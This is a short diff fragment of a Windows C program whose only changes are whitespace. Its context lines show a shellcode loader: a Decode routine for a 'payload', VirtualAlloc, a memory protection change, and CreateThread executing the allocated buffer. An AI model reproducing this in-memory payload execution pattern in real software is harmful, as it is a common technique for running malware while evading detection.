@@ -19,7 +19,7 @@ void Decode(unsigned char* payload) {
 }
 
 int main() {
-	
+
 	LPVOID alloc_mem = VirtualAlloc(NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!alloc_mem) {
 		printf("Failed to Allocate memory (%u)\n", GetLastError());
@@ -41,7 +41,7 @@ int main() {
 		printf("Failed to Change memory protection (%u)\n", GetLastError());
 		return -2;
 	}
-	
+
 	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
 	if (!tHandle) {
 		printf("Failed to create the Thread (%u)\n", GetLastError());
